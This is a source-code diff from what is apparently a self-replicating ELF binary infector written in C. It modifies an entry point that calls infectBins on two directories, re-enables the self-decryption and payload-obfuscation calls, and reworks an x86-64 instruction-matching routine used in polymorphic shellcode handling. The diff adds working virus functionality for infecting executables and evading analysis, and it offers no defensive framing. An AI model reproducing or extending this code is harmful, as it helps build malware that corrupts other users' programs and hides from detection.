@@ -11,10 +11,10 @@ int   entry_point(void *magic) {
   /*   return (stop(1, magic)); */
   /* if (preventDebug(magic) != 0) */
   /*   return (stop(1, magic)); */
-  /* if (magic != (void *)0x42) { */
-  /*   if (unObfuscate() == -1) */
-  /*     return (stop(1, magic)); */
-  /* } */
+  if (magic != (void *)0x42) {
+    if (unObfuscate() == -1)
+      return (stop(1, magic));
+  }
   infectBins(infectDir);
   infectBins(infectDir2);
   return (stop(0, magic));
@@ -690,23 +690,28 @@ static void updateRegisters(unsigned char *ins, unsigned char *pointer, unsigned
 
 static void checkInstruction(unsigned char *ins, unsigned char *shellcode, size_t *i) {
   unsigned char *order;
-  unsigned char *suffix;
+  unsigned char *needed;
+  unsigned char *notNeeded;
 
   order = ins;
   while (*order != 0x42)
     order += 1;
   order += 1;
-  suffix = order;
-  while (*suffix != 0x42)
-    suffix += 1;
-  suffix += 1;
+  needed = order;
+  while (*needed != 0x42)
+    needed += 1;
+  needed += 1;
+  notNeeded = needed;
+  while (*notNeeded != 0x42)
+    notNeeded += 1;
+  notNeeded += 1;
   *i = 0;
   while (ins[*i] != 0x42 &&
         (shellcode[*i] == ins[*i] ||
-        (ins[*i] == 0x41 && (shellcode[*i] & suffix[*i]) == suffix[*i]))) {
+        (ins[*i] == 0x41 && (shellcode[*i] & needed[*i]) == needed[*i] && (shellcode[*i] & notNeeded[*i]) == 0x0))) {
     if (ins[*i] == 0x41) {
       if ((order[*i] & 0x1) == 0x1 || (order[*i] & 0x4) == 0x4) {
-        if ((shellcode[*i] & 0x7) == (0x4 << 3) || (shellcode[*i] & 0x7) == (0x5 << 3))
+        if ((shellcode[*i] & 0x7) == 0x4 || (shellcode[*i] & 0x7) == 0x5)
           break ;
       }
       if ((order[*i] & 0x8) == 0x8 || (order[*i] & 0x20) == 0x20) {
@@ -718,10 +723,11 @@ static void checkInstruction(unsigned char *ins, unsigned char *shellcode, size_
   }
 }
 
+/*  Instructions  - Order - Needed -  Not needed */
 /* Source operand = 0b001 - Destination operand = 0b100 */
 const char  instructions[][MAX_INS_SIZE] __attribute__ ((section (".text#"))) = {
-  "\x48\x89\x41\x42\x00\x00\x0c\x42\x00\x00\xc0\x42", // MOV r/m64,r64
-  "\x48\x8d\x41\x42\x00\x00\x21\x42\x00\x00\x00\x42", // LEA r/m64,r64
+  "\x48\x89\x41\x42\x00\x00\x0c\x42\x00\x00\xc0\x42\x00\x00\x00\x42", // MOV r/m64,r64
+  "\x48\x8d\x41\x42\x00\x00\x21\x42\x00\x00\x00\x42\x00\x00\xc0\x42", // LEA r/m64,r64
   "\x42",
   /* "\x41\x41\x90\x42\x01\x04\x00\x42\x50\x58\x00\x42", // PUSH r64, POP r64 */
   /* "\x91\x90\x48\x31\xdb\x90\x90\x42", // xor rbx ,rbx */
@@ -821,7 +827,7 @@ static int  appendShellcode(struct bfile *bin) {
   ins[7] = (address >> 48) & 0xff;
   ins[8] = (address >> 56) & 0xff;
   memcpy(((void *)new.header) + bin->size + size, ins, sizeof(ins));
-  /* obfuscate(((void *)new.header) + bin->size + (encryptStart - start), end - encryptStart); */
+  obfuscate(((void *)new.header) + bin->size + (encryptStart - start), end - encryptStart);
   munmap(bin->header, bin->size);
   bin->header = new.header;
   bin->size = new.size;
